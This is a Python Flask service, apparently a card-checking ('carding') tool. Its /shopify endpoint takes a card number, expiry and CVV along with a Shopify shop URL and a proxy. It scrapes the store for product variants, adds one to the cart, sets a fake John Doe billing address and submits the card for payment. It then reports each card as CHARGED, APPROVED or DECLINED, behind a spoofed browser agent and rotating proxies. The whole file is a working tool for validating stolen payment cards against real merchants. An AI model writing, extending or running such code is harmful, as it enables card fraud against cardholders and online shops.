import os
import json
import re
import httpx
from flask import Flask, request, jsonify
from urllib.parse import urljoin

app = Flask(__name__)

# ===== Configuration =====
PORT = int(os.environ.get("PORT", 8099))
TIMEOUT = 30.0
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DEFAULT_VARIANT_ID = os.environ.get("DEFAULT_VARIANT_ID", None)

# ===== Helper Functions =====
def parse_card(card_str):
    parts = card_str.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid card format. Use number|mm|yy|cvv")
    return {
        "number": parts[0].strip(),
        "month": parts[1].strip(),
        "year": parts[2].strip(),
        "cvv": parts[3].strip()
    }

def normalize_year(y):
    return "20" + y if len(y) == 2 else y

def parse_shop_url(url):
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip('/')

def get_proxy_url(proxy):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith(("http://", "https://", "socks5://")):
        return proxy
    parts = proxy.split('@')
    if len(parts) == 2:
        user_pass = parts[0]
        host_port = parts[1]
        return f"http://{user_pass}@{host_port}"
    segments = proxy.split(':')
    if len(segments) == 2:
        return f"http://{proxy}"
    elif len(segments) == 4:
        ip, port, user, password = segments[0], segments[1], segments[2], segments[3]
        return f"http://{user}:{password}@{ip}:{port}"
    else:
        return f"http://{proxy}"

# ===== Product Detection (returns list of candidate variant IDs) =====
def get_candidate_variant_ids(client, shop_url):
    candidates = set()
    if DEFAULT_VARIANT_ID:
        candidates.add(DEFAULT_VARIANT_ID)

    # 1. Homepage product links
    try:
        resp = client.get(shop_url)
        if resp.status_code == 200:
            matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
            for handle in matches:
                prod_url = urljoin(shop_url, f"/products/{handle}.js")
                vresp = client.get(prod_url)
                if vresp.status_code == 200:
                    data = vresp.json()
                    for variant in data.get("variants", []):
                        candidates.add(str(variant["id"]))
    except Exception as e:
        app.logger.warning(f"Homepage method failed: {e}")

    # 2. /products.json
    try:
        json_url = urljoin(shop_url, "/products.json")
        resp = client.get(json_url)
        if resp.status_code == 200:
            data = resp.json()
            for product in data.get("products", []):
                for variant in product.get("variants", []):
                    candidates.add(str(variant["id"]))
    except Exception as e:
        app.logger.warning(f"products.json method failed: {e}")

    # 3. /collections/all
    try:
        coll_url = urljoin(shop_url, "/collections/all")
        resp = client.get(coll_url)
        if resp.status_code == 200:
            matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
            for handle in matches:
                prod_url = urljoin(shop_url, f"/products/{handle}.js")
                vresp = client.get(prod_url)
                if vresp.status_code == 200:
                    data = vresp.json()
                    for variant in data.get("variants", []):
                        candidates.add(str(variant["id"]))
    except Exception as e:
        app.logger.warning(f"Collections method failed: {e}")

    # 4. /collections/all/products.json
    try:
        json_url = urljoin(shop_url, "/collections/all/products.json")
        resp = client.get(json_url)
        if resp.status_code == 200:
            data = resp.json()
            for product in data.get("products", []):
                for variant in product.get("variants", []):
                    candidates.add(str(variant["id"]))
    except Exception as e:
        app.logger.warning(f"Collections json method failed: {e}")

    # 5. Common handles
    common_handles = ["default", "product", "main", "featured", "shop"]
    for handle in common_handles:
        try:
            prod_url = urljoin(shop_url, f"/products/{handle}.js")
            vresp = client.get(prod_url)
            if vresp.status_code == 200:
                data = vresp.json()
                for variant in data.get("variants", []):
                    candidates.add(str(variant["id"]))
        except Exception as e:
            continue

    # 6. Ultimate fallback: try variant ID 1
    candidates.add("1")

    # Remove None and empty
    candidates = {c for c in candidates if c}
    return list(candidates)

def try_add_to_cart(client, shop_url, variant_id):
    """Try adding to cart using both /cart/add.js and /cart/add."""
    endpoints = ["/cart/add.js", "/cart/add"]
    for endpoint in endpoints:
        add_url = urljoin(shop_url, endpoint)
        payload = {"id": variant_id, "quantity": 1}
        try:
            resp = client.post(add_url, json=payload)
            if resp.status_code == 200:
                cart_data = resp.json()
                if "items" in cart_data and cart_data["items"]:
                    return cart_data
                else:
                    app.logger.warning(f"Add to cart succeeded but no items: {cart_data}")
            else:
                app.logger.debug(f"Endpoint {endpoint} returned {resp.status_code}")
        except Exception as e:
            app.logger.warning(f"Add to cart attempt failed: {e}")
    return None

# ===== Core Checkout =====
def perform_checkout(card_data, shop_url, proxy):
    proxy_url = get_proxy_url(proxy)
    app.logger.info(f"Using proxy: {proxy_url if proxy_url else 'None'}")
    with httpx.Client(
        timeout=TIMEOUT,
        follow_redirects=True,
        headers={
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
        },
        proxies=proxy_url
    ) as client:
        # Get candidate variant IDs
        candidates = get_candidate_variant_ids(client, shop_url)
        app.logger.info(f"Candidates: {candidates}")

        # Try each candidate
        cart_data = None
        valid_variant = None
        for vid in candidates:
            if not vid:
                continue
            app.logger.info(f"Trying variant ID: {vid}")
            cart_data = try_add_to_cart(client, shop_url, vid)
            if cart_data:
                valid_variant = vid
                break

        if not cart_data:
            return {"status": "ERROR", "message": "No valid product found", "retryable": True}

        # Extract checkout token
        items = cart_data.get("items", [])
        if not items:
            return {"status": "ERROR", "message": "No items in cart", "retryable": True}
        checkout_token = items[0].get("checkout_token")
        if not checkout_token:
            return {"status": "ERROR", "message": "No checkout token", "retryable": True}

        # Set billing address
        billing = {
            "billing_address": {
                "first_name": "John",
                "last_name": "Doe",
                "address1": "123 Main St",
                "city": "New York",
                "province": "NY",
                "zip": "10001",
                "country": "US",
                "phone": "2125555555",
                "company": ""
            }
        }
        bill_url = f"{shop_url}/checkout/{checkout_token}/billing_address.json"
        try:
            resp = client.post(bill_url, json=billing)
            if resp.status_code not in (200, 201):
                return {"status": "ERROR", "message": "Failed to set billing address", "retryable": True}
        except Exception as e:
            app.logger.error(f"Billing address error: {e}")
            return {"status": "ERROR", "message": f"Billing error: {str(e)}", "retryable": True}

        # Submit payment
        payment_payload = {
            "payment": {
                "credit_card": {
                    "number": card_data["number"],
                    "month": card_data["month"],
                    "year": normalize_year(card_data["year"]),
                    "verification_value": card_data["cvv"],
                    "first_name": "John",
                    "last_name": "Doe"
                },
                "billing_address": billing["billing_address"]
            }
        }
        pay_url = f"{shop_url}/checkout/{checkout_token}/payment.json"
        try:
            resp = client.post(pay_url, json=payment_payload)
            if resp.status_code == 200:
                result = resp.json()
                status = result.get("status")
                if status == "completed":
                    return {
                        "status": "CHARGED",
                        "message": "Payment captured",
                        "amount": result.get("amount", "0.00"),
                        "gateway": "Shopify Payments",
                        "receipt_url": result.get("receipt_url", ""),
                        "retryable": False
                    }
                elif status == "authorized":
                    return {
                        "status": "APPROVED",
                        "message": "Auth approved",
                        "amount": result.get("amount", "0.00"),
                        "gateway": "Shopify Payments",
                        "receipt_url": "",
                        "retryable": False
                    }
                else:
                    msg = result.get("message", "Unknown decline")
                    if "insufficient" in msg.lower():
                        return {"status": "DECLINED", "message": "Insufficient funds", "retryable": False}
                    elif "3d" in msg.lower() or "3d_secure" in msg.lower():
                        return {"status": "DECLINED", "message": "3DS required", "retryable": False}
                    else:
                        return {"status": "DECLINED", "message": msg, "retryable": False}
            else:
                text = resp.text.lower()
                if "3d" in text or "3d_secure" in text:
                    return {"status": "DECLINED", "message": "3DS required", "retryable": False}
                return {
                    "status": "DECLINED",
                    "message": f"Payment failed (HTTP {resp.status_code})",
                    "retryable": False
                }
        except httpx.TimeoutException:
            return {"status": "ERROR", "message": "Payment timeout", "retryable": True}
        except Exception as e:
            app.logger.error(f"Payment exception: {e}")
            return {"status": "ERROR", "message": f"Payment error: {str(e)}", "retryable": True}

# ===== Flask Routes =====
@app.route('/shopify', methods=['POST'])
def shopify():
    """Main endpoint for card checks."""
    data = request.get_json()
    if not data:
        return jsonify({"status": "ERROR", "message": "Missing JSON body"}), 400

    card_str = data.get('card')
    shop_url = data.get('shop_url')
    proxy = data.get('proxy', '')

    if not card_str or not shop_url:
        return jsonify({"status": "ERROR", "message": "Missing card or shop_url"}), 400

    try:
        card = parse_card(card_str)
        shop_url = parse_shop_url(shop_url)
        result = perform_checkout(card, shop_url, proxy)
        return jsonify(result)
    except ValueError as e:
        app.logger.error(f"Card parse error: {e}")
        return jsonify({"status": "ERROR", "message": str(e), "retryable": False}), 400
    except Exception as e:
        app.logger.error(f"Unhandled error: {e}")
        return jsonify({"status": "ERROR", "message": f"Internal error: {str(e)}", "retryable": True}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8099))
    app.run(host='0.0.0.0', port=port)
